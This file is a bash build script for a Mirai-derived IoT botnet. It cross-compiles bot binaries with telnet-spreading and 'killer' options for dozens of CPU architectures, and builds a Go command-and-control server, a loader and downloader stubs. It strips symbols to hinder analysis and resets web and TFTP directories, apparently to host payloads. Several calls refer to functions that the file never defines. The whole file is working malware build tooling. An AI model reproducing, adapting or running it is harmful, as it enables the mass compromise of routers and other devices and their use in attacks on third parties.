#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin

export PATH=$PATH:/etc/xcompile/aarch64be/bin
export PATH=$PATH:/etc/xcompile/aarch64/bin
# export PATH=$PATH:/etc/xcompile/arcle-750d/bin
# export PATH=$PATH:/etc/xcompile/arcle-hs38/bin
export PATH=$PATH:/etc/xcompile/bfin/bin
export PATH=$PATH:/etc/xcompile/m68k-68xxx/bin
export PATH=$PATH:/etc/xcompile/m68k-coldfire/bin
export PATH=$PATH:/etc/xcompile/microblazebe/bin
export PATH=$PATH:/etc/xcompile/microblazeel/bin
export PATH=$PATH:/etc/xcompile/nios2/bin
export PATH=$PATH:/etc/xcompile/openrisc/bin
export PATH=$PATH:/etc/xcompile/riscv64/bin
export PATH=$PATH:/etc/xcompile/sh-sh4aeb/bin
export PATH=$PATH:/etc/xcompile/sh-sh4/bin
export PATH=$PATH:/etc/xcompile/x86-64-core-i7/bin
export PATH=$PATH:/etc/xcompile/x86-core2/bin
export PATH=$PATH:/etc/xcompile/x86-i686/bin
export PATH=$PATH:/etc/xcompile/xtensa-lx60/bin
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/alpha/bin
export PATH=$PATH:/etc/xcompile/mips64/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function othercpu_bot {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function arm7_compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}
function honeyx86_bot {
    "$1-gcc" -std=c99 $3 botH/x86/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeymips_bot {
    "$1-gcc" -std=c99 $3 botH/mips/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeympsl_bot {
    "$1-gcc" -std=c99 $3 botH/mpsl/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyspc_bot {
    "$1-gcc" -std=c99 $3 botH/spc/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyppc_bot {
    "$1-gcc" -std=c99 $3 botH/ppc/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeym68k_bot {
    "$1-gcc" -std=c99 $3 botH/m68k/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeysh4_bot {
    "$1-gcc" -std=c99 $3 botH/sh4/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
# arm hehe
function honeyarm_bot {
    "$1-gcc" -std=c99 $3 botH/arm/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarm5_bot {
    "$1-gcc" -std=c99 $3 botH/arm5/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarm6_bot {
    "$1-gcc" -std=c99 $3 botH/arm6/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarm7_bot {
    "$1-gcc" -std=c99 $3 botH/arm7/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyxtensa_bot {
    "$1-linux-gcc" -std=c99 $3 botH/xtensa/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeybfin_bot {
    "$1-linux-gcc" -std=c99 $3 botH/bfin/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyriscv64_bot {
    "$1-linux-gcc" -std=c99 $3 botH/riscv64/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeynios2_bot {
    "$1-linux-gcc" -std=c99 $3 botH/nios2/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyaarch64_bot {
    "$1-linux-gcc" -std=c99 $3 botH/aarch64/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyx86_64_bot {
    "$1-linux-gcc" -std=c99 $3 botH/x86_64/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function honeyarc_bot {
    "$1-linux-gcc" -std=c99 $3 botH/arc/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o release/"$2"
}


rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/358835865482368
mkdir /var/www/html/13747243572475
mkdir /var/www/html/swrgiuhguhwrguiwetu
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/

compile_bot i586 x86 "-static -DTELNET -DX86_64 -w"
compile_bot mips mips "-static -DTELNET -w"
compile_bot mipsel mpsl "-static -DKILLER -DTELNET -w"
compile_bot armv4l arm "-static -DKILLER -DTELNET -w"
compile_bot armv5l arm5 "-DKILLER -DTELNET -w"
compile_bot armv6l arm6 "-static -DKILLER -DTELNET -w"
arm7_compile_bot armv7l arm7 "-static -DKILLER -DTELNET -w"
compile_bot powerpc ppc "-static -DKILLER -DTELNET -w"
compile_bot sparc spc "-static -DKILLER -DTELNET -w"
compile_bot m68k m68k "-static -DKILLER -DTELNET -w"
compile_bot sh4 sh4 "-static -DKILLER -DTELNET -w"
arc_compile arc harc "-static -DKILLER -DTELNET -w"
othercpu_bot i686 hx86_64 "-static -DKILLER -DTELNET -w"


# honeypot bin compile
honeyarm_bot armv4l harm "-static"
honeyarm5_bot armv5l harm5 "-static"
honeyarm6_bot armv6l harm6 "-static"
honeyarm7_bot armv7l harm7 "-static"
honeymips_bot mips hmips "-static"
honeympsl_bot mipsel hmpsl "-static"
honeyspc_bot sparc hspc "-static"
honeyppc_bot powerpc hppc "-static"
honeym68k_bot m68k hm68k "-static"
honeysh4_bot sh4 hsh4 "-static"
honeyx86_bot i586 hx86 "-static"
#honeyarc_bot arc harc "-static"

honeyx86_64_bot i686 hx86_64 "-static"

honeyxtensa_bot xtensa hxtensa "-static"
honeyaarch64be_bot aarch64 haarch64 "-static"
honeynios2_bot nios2 hnios2 "-static"
honeyor1k_bot or1k hor1k "-static"
honeybfin_bot bfin hbfin "-static"
honeyor1k_bot riscv64 hriscv64 "-static"

/etc/xcompile/xtensa-lx60/bin/xtensa-linux-gcc bot/*.c -o release/hxtensa -Dxtensa-lx60 -DTELNET -w
/etc/xcompile/alpha/bin/alpha-linux-gcc bot/*.c -o release/halpha -Dalpha -DTELNET -w
 /etc/xcompile/aarch64/bin/aarch64-linux-gcc bot/*.c -o release/haarch64 -Daarch64 -DTELNET -w
 /etc/xcompile/bfin/bin/bfin-linux-gcc bot/*.c -o release/hbfin -Dbfin -DTELNET -w
 /etc/xcompile/nios2/bin/nios2-linux-gcc bot/*.c -o release/hnios2 -Dnios2 -DTELNET -w
 /etc/xcompile/openrisc/bin/or1k-linux-gcc bot/*.c -o release/hopenrisc -Dopenrisc -DTELNET -w
 /etc/xcompile/riscv64/bin/riscv64-linux-gcc bot/*.c -o release/hriscv64 -Driscv64 -DTELNET -w


 /etc/xcompile/alpha/bin/alpha-linux-gcc bot/*.c -o release/alpha -DALPHA -static -DTELNET -w
 /etc/xcompile/mips64/bin/mips64-linux-gcc bot/*.c -o release/mips64 -DMIPS64 -static -DTELNET -w
 /etc/xcompile/arcle-750d/bin/arc-linux-gcc bot/*.c -o release/arcle-750d -Darcle-750d -static -DTELNET -w
 /etc/xcompile/arcle-hs38/bin/arc-linux-gcc bot/*.c -o release/arcle-hs38 -Darcle-hs38 -static -DTELNET -w
 /etc/xcompile/microblazebe/bin/microblaze-linux-gcc bot/*.c -o release/microblazebe -Dmicroblazebe -static -DTELNET -w
 /etc/xcompile/microblazeel/bin/microblazeel-linux-gcc bot/*.c -o release/microblazeel -Dmicroblazeel -static -DTELNET -w
 /etc/xcompile/m68k-68xxx/bin/m68k-linux-gcc bot/*.c -o release/m68k-68xxx -Dm68k-68xxx -static -DTELNET -w
 /etc/xcompile/m68k-coldfire/bin/m68k-linux-gcc bot/*.c -o release/m68k-coldfire -Dm68k-coldfire -static -DTELNET -w
 /etc/xcompile/aarch64be/bin/aarch64_be-linux-gcc bot/*.c -o release/aarch64be -Daarch64be -static -DTELNET -w
 /etc/xcompile/sh-sh4/bin/sh4-linux-gcc bot/*.c -o release/sh-sh4 -Dsh-sh4 -static -DTELNET -w

gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc

echo "LightIsSpooky" > ~/dlr/release/dlr.arc
echo "LightIsSpooky" > ~/dlr/release/dlr.alpha
alpha-linux-gcc -Os -D BOT_ARCH=\"alpha\" -D ALPHA -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.alpha
mips64-linux-gcc -Os -D BOT_ARCH=\"mips64\" -D ALPHA -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips64
aarch64-linux-gcc -Os -D BOT_ARCH=\"aarch64\" -D aarch64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e  -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.aarch64
aarch64_be-linux-gcc -Os -D BOT_ARCH=\"aarch64be\" -D aarch64be -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.aarch64be
arc-linux-gcc -Os -D BOT_ARCH=\"arcle-750d\" -D arcle-hs38 -Wl,--gc-sections -fdata-sections -ffunction-sections -e  -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arcle-750d
bfin-linux-gcc -Os -D BOT_ARCH=\"bfin\" -D bfin -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.bfin
m68k-linux-gcc -Os -D BOT_ARCH=\"hm68k-68xxx\" -D m68k-68xxx -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68klinux
m68k-linux-gcc -Os -D BOT_ARCH=\"hm68k-coldfire\" -D m68k-coldfire -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.hm68k-coldfire
microblazeel-linux-gcc -Os -D BOT_ARCH=\"microblazebe\" -D microblazebe -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.microblazebe
microblazebe-linux-gcc -Os -D BOT_ARCH=\"microblazeel\" -D microblazeel -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.microblazeel
nios2-linux-gcc -Os -D BOT_ARCH=\"nios2\" -D nios2 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.nios2
or1k-linux-gcc -Os -D BOT_ARCH=\"or1k\" -D openrisc -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.or1k
riscv64-linux-gcc -Os -D BOT_ARCH=\"riscv64\" -D riscv64 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.riscv64
sh4-linux-gcc -Os -D BOT_ARCH=\"hsh-sh4\" -D sh-sh4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.hsh-sh4
x86_64-linux-gcc -Os -D BOT_ARCH=\"x86_64\" -D x86-core2 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86_64
i686-linux-gcc -Os -D BOT_ARCH=\"i686\" -D x86-i686 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.i686
xtensa-linux-gcc -Os -D BOT_ARCH=\"xtensa\" -D xtensa-lx60 -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.xtensa
arc-linux-gcc -Os -D BOT_ARCH=\"arc\" -D arc -Wl,--gc-sections -fdata-sections -ffunction-sections -e -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arc

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc

aarch64-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.aarch64
aarch64_be-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.aarch64be
arc-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arcle-750d
bfin-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.bfin
m68k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68klinux
m68k-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hm68k-coldfire
microblaze-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.hm68k-coldfire
microblazeel-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.microblazebe
nios2-linux-strip -S --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr2/release/dlr.nios2
